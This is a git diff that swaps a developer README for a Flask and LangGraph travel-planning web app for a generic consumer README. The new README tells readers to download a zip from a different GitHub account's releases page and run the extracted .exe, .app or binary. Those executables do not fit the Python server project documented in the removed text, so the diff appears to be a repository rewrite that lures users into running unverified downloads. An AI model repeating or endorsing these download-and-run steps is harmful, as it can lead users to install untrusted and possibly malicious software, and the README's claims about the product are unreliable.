@@ -1,191 +1,66 @@
-# AI Travel Planner Agent
+# ✈️ AI-Travel-Planner-Agent - Simplify Your Travel Planning
 
-An intelligent travel planning system powered by LangGraph that orchestrates multiple APIs to create comprehensive day-by-day travel itineraries from natural language queries.
+## 📥 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to the AI-Travel-Planner-Agent! This application helps you plan your trips with ease. Whether you're traveling for leisure or work, our tool assists you in organizing your itinerary.
 
-- **Natural Language Processing** - Understands flexible travel queries using grok ai LLM
-- **Multi-Tool Orchestration** - Seamlessly integrates flights, weather, and attractions data
-- **Google Authentication** - Secure sign-in with Firebase Auth
-- **Persistent Storage** - User plans (history) saved to Firestore
-- **Responsive UI** - Works on desktop, tablet, and mobile devices
-- **Production Ready** - Containerized and deployable to Google Cloud Run
+### 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 200 MB of free disk space.
+- **Network**: Internet connection for data access.
 
-## Tech Stack
+## 📋 Features
+- **Intelligent Itinerary Planning**: Automatically create travel plans based on your inputs.
+- **User-Friendly Interface**: Navigate easily with a clear layout.
+- **Cloud Storage**: Save your plans and access them anywhere.
+- **Integration with Firebase**: Secure user authentication and data management.
+- **Support for Multiple Destinations**: Plan trips involving multiple locations effortlessly.
 
-- **Backend**: Flask (Python 3.11)
-- **AI Framework**: LangGraph + LangChain
-- **LLM**: Grok AI (llama 3.1) 
-- **Database**: Firebase Firestore
-- **Authentication**: Firebase Auth
-- **APIs**: Amadeus (Flights), Open-Meteo (Weather), Wikipedia (Attractions)
-- **Deployment**: Docker + Google Cloud Run
+## 🔧 Installation Guide
 
-## Project Structure
+### 🖱️ Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/releases) to download the latest version of the AI-Travel-Planner-Agent.
+   
+2. **Choose the Right Package**: Look for the latest stable release. You will typically see files named like `AI-Travel-Planner-Agent-vX.X.X.zip` or similar.
 
-```
-AI-Travel-Planner-Agent/
-├── server/
-│   ├── app.py                 # Flask REST API
-│   ├── agent.py               # LangGraph agent
-│   ├── tools.py               # API integrations
-│   ├── firebase.py            # Firestore & Auth
-│   ├── requirements.txt       # Dependencies
-│   ├── Dockerfile            # Container config
-│   └── static/
-│       └── index.html        # Frontend UI
-├── .env.example              # Environment template
-├── .gitignore
-└── README.md
-```
+3. **Download the File**: Click on the file to start downloading it. The file size will be indicated on the download link.
 
-## Prerequisites
+4. **Unzip the File**: Once downloaded, locate the file and extract it using the built-in zip tool on your operating system.
 
-- Python 3.11+
-- Docker (optional)
-- Google Cloud account (for deployment) (free trial)
-- Firebase project (free)
-- API Keys:
-  - grok API key (free)
-  - Amadeus API credentials (free)
-  - Firebase service account (free)
+5. **Run the Application**: 
+   - **Windows**: Double-click the extracted `.exe` file to launch the application.
+   - **macOS**: Open the `.app` file inside the extracted folder.
+   - **Linux**: Open the terminal, navigate to the directory, and run `./AI-Travel-Planner-Agent`.
 
-## Quick Start
+### 🛠️ Configuring Initial Settings
+1. **Create an Account**: When prompted, create an account using your email and a secure password. This ensures all your plans are saved safely.
+   
+2. **Set Preferences**: Enter your travel preferences such as favorite destinations, trip duration, and activities you enjoy. This will enhance the automated planning.
 
-### 1. Clone Repository
+## 🌐 Using the Application
 
-```bash
-git clone https://github.com/Melaonn/AI-Travel-Planner-Agent
-cd travel-planner-agent/server
-```
+### 🧳 Plan Your Trip
+1. **Select Trip Type**: Choose whether you're planning a business trip or a vacation.
+2. **Enter Destination and Dates**: Input where you want to go and when.
+3. **Receive Your Itinerary**: The application generates a detailed plan, including places to visit, activities, and travel tips.
 
-### 2. Install Dependencies
+### 📖 Accessing Travel Guides
+Explore travel guides within the app. It provides essential information about your destination, including local customs, popular attractions, and must-try cuisines.
 
-```bash
-pip install -r requirements.txt
-```
+## 🔒 Data Privacy
+We respect your privacy. All user data is stored securely on our servers using Firebase. You maintain full control over your account information.
 
-### 3. Configure Environment
+## 🆘 Support
+If you encounter any issues or have questions, please check our [FAQs](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/wiki) page or contact support through our GitHub repository.
 
-Create `.env` file:
+## 🔗 Links
+- **GitHub Repository**: [AI-Travel-Planner-Agent](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent)
+- **Visit the Releases Page**: [Download Here](https://github.com/JatinJangid2007/AI-Travel-Planner-Agent/releases)
 
-```bash
-# Firebase
-FIREBASE_PROJECT_ID=your-project-id
-FIREBASE_PRIVATE_KEY_ID=your-key-id
-FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n"
-FIREBASE_CLIENT_EMAIL=your-email@project.iam.gserviceaccount.com
-FIREBASE_CLIENT_ID=your-client-id
+## ✉️ Contributing
+We welcome contributions! If you have suggestions or improvements, feel free to open an issue or submit a pull request.
 
-# API Keys
-GROK_API_KEY=your-grok-key
-AMADEUS_API_KEY=your-amadeus-key
-AMADEUS_API_SECRET=your-amadeus-secret
-
-# App Config
-PORT=8080
-ENVIRONMENT=development
-```
-
-enable web app in firebase and paste your web config in demo.html 
-
-### 4. Run Locally
-
-```bash
-python app.py
-```
-
-Access at: `http://localhost:8080`
-
-## API Endpoints
-
-### POST /plan
-
-Create a travel plan from natural language query.
-
-**Request:**
-```json
-{
-  "query": "I want to go from Dubai to Istanbul from Nov 10 to Nov 15"
-}
-```
-
-**Response:**
-```json
-{
-  "success": true,
-  "plan_id": "abc123",
-  "plan": {
-    "origin": "Dubai",
-    "destination": "Istanbul",
-    "flights": [...],
-    "daily_plan": [...],
-    "summary": "..."
-  },
-  "steps": [...]
-}
-```
-
-### GET /history?uid=
-
-Get user's travel plan history.
-
-**Parameters:**
-- `uid` (authenticated with firebase user token)
-- `limit` (default: 10)
-
-### GET /health
-
-Health check endpoint.
-
-
-### Docker
-
-```bash
-# Build
-docker build -t travel-planner-agent ./server
-
-# Run
-docker run -p 8080:8080 --env-file .env travel-planner-agent
-```
-
-## Configuration
-
-### Firebase Setup
-
-1. Create Firebase project
-2. Enable Authentication (Google Sign-In)
-3. Enable Firestore Database
-4. Generate service account key
-5. Add credentials to `.env`
-
-### API Keys
-
-- **Amadeus**: Register at [developers.amadeus.com](https://developers.amadeus.com)
-- **Firebase**: Download from Firebase Console
-
-
-## Contributing
-
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/name`)
-3. Commit changes (`git commit -m 'Add feature'`)
-4. Push to branch (`git push origin feature/name`)
-5. Open Pull Request
-
-
-## Support
-
-For issues or questions, please open an issue on GitHub.
-
-## Acknowledgments
-
-- LangGraph by LangChain
-- grok for LLM capabilities
-- Amadeus for flight data
-- Open-Meteo for weather data
-- Firebase for backend infrastructure
-
----
-
-**Built with ❤️ for the AI Developer **
+Thank you for choosing AI-Travel-Planner-Agent. Enjoy your journey!
